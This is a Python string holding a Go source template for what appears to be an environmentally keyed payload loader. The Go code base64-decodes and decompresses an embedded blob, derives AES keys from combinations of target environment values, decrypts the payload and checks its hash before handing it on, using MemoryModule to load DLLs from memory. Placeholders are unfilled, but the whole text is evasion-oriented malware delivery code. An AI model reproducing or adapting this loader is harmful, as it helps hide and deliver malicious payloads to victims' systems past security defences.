buildcode="""
package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
        {8}
)

func check(e error) bool{{
    if e != nil {{
        return false
    }}
    return true
}}


func build_code(payload []byte, payload_hash []byte, minus_bytes int, key_combos [][]string) []byte{{
    
    // ---Decode and Decompress the payload---
    
    var output bytes.Buffer
    
    data, err := base64.StdEncoding.DecodeString(string(payload))

    var b bytes.Buffer
    
    b.Write([]byte(data))

    r, _ := zlib.NewReader(&b)
    io.Copy(&output, r)
    r.Close()
    // ---FIN Decode and Decompress payload---


    // --read IV--

    iv := make([]byte, 16)
    _, err = output.Read(iv)
    check(err)
    
    fmt.Printf("[*] IV: %x\\n", iv)

    
    // --Read Encrypted Payload--

    size_of_full_table := output.Len()

    fmt.Println("[*] Size of encrypted_payload: ", size_of_full_table)

    encrypted_payload := make([]byte, size_of_full_table)
    
    _, err = output.Read(encrypted_payload)
    
    fmt.Printf("[*] Hash of encrypted_payload: %x\\n",sha512.Sum512(encrypted_payload))
        

    // -- Build Key list --

    key_list := []string{{}} 
    
    
    for _, item := range key_combos {{
        //fmt.Println("len item", len(item), item)
        
        if len(item) == 0{{
            continue
        }}
        if len(item) == 1{{
            //fmt.Println("this is a string")
            //fmt.Println("key_list",len(key_list))
            if len(key_list) == 0{{
                //fmt.Println("key_list is 0 for string")
                key_list = append(key_list, item[0])
            }}else{{
                another_temp := []string{{}}
                for _, existing_value := range key_list{{
                    another_temp = append(another_temp, existing_value + item[0])
                }}
                key_list = another_temp
            }}   
        
        }}else{{
            //fmt.Println("this is an array")
            if len(key_list) == 0 {{
                //fmt.Println("key_list is 0 in array")
                for _,astring := range item {{
                    key_list = append(key_list, astring)

                }}
            }} else {{

                another_temp := []string{{}}
                for _, sub_item := range item{{
                    //fmt.Println("\tsub_item:", sub_item)
                        for _,existing_value := range key_list {{
                            //fmt.Println("existing_value", sub_item)
                            another_temp = append(another_temp, existing_value + sub_item)
                        }}
                }}
                key_list = another_temp
            }}
            //fmt.Println("key_list checkup:", key_list)
        }}
        
    }}

    fmt.Println("[*] Number of keys:", len(key_list))
    fmt.Println("[*] Final key_list:", key_list)
    
    for _, key := range key_list{{
        fmt.Println("==================================================")
        temp_encrypted_payload := make([]byte, len(encrypted_payload))
        copy(temp_encrypted_payload, encrypted_payload)
        
        fmt.Println("[*] Key:", key)
        raw_key := []byte(key)
        // take sha512 of key

        kIterations := {9}
        
        raw_key_512 := sha512.Sum512(raw_key)
        for kIterations > 1 {{
            raw_key_512 = sha512.Sum512(raw_key_512[:])
            kIterations -= 1
        }}

        // chomp key to 32 bytes for 256 bit key
        password := raw_key_512[:32]

        fmt.Printf("[*] Computed Full Key @ %x iterations: %x\\n", {9}, raw_key_512)
        
        //Decrypt

        fmt.Printf("[*] AES Password %x\\n", password)


        aesBlock, err3 := aes.NewCipher(password)
        check(err3)

        cfbDecrypter := cipher.NewCFBDecrypter(aesBlock, iv)
        cfbDecrypter.XORKeyStream(temp_encrypted_payload, temp_encrypted_payload)
        fmt.Printf("[*] Decoded Payload with Padding: %x\\n",sha512.Sum512(temp_encrypted_payload))
        s := bytes.TrimRight(temp_encrypted_payload, "{{")

        decoded_payload, err := base64.StdEncoding.DecodeString(string(s))
        
        if check(err) == false{{
            fmt.Println("[!] Error: Error with Decryption")
            continue
        }}
        fmt.Printf("[*] Message Length: %v\\n", len(decoded_payload))
        //fmt.Printf("%v\\n", hex.EncodeToString(decoded_payload)) 
        fmt.Printf("[*] Message Length w/ Padding: %v\\n", len(decoded_payload))
        //fmt.Printf("%v\\n", hex.EncodeToString(decoded_payload)) 

        // ##Review## Does this need iterations too??
        payload_test_hash := sha512.Sum512(decoded_payload[:len(decoded_payload) - minus_bytes])
        fmt.Printf("[*] Test Hash : %x\\nSearch Hash: %x\\n", payload_test_hash, payload_hash)
        
        final_result := bytes.Equal(payload_test_hash[:], payload_hash[:])
        if final_result == true {{
            fmt.Println("[*] Hashes Match")
            return decoded_payload
        }} else {{
            fmt.Println("[!] Failed Hash Match")
            return nil
        }}  
    }}
    return nil

}}

{5}

func main() {{
    
    // final hash for testing
    payload_hash, err := hex.DecodeString("{1}")
    check(err)
    
    // This is the minus bytes used in this test
    minus_bytes := int({2})
    
    start_loc := string(`{4}`)
    
    key_combos := make([][]string, {7}) // len of evironmentals..
    
    i := int(0)

    lookup_table := []byte("{0}")
    
    // populate key_combos

    {6}

    fmt.Println("[*] Key Combinations: ", key_combos)

    {3}
    
   _ = start_loc

    
}}
"""
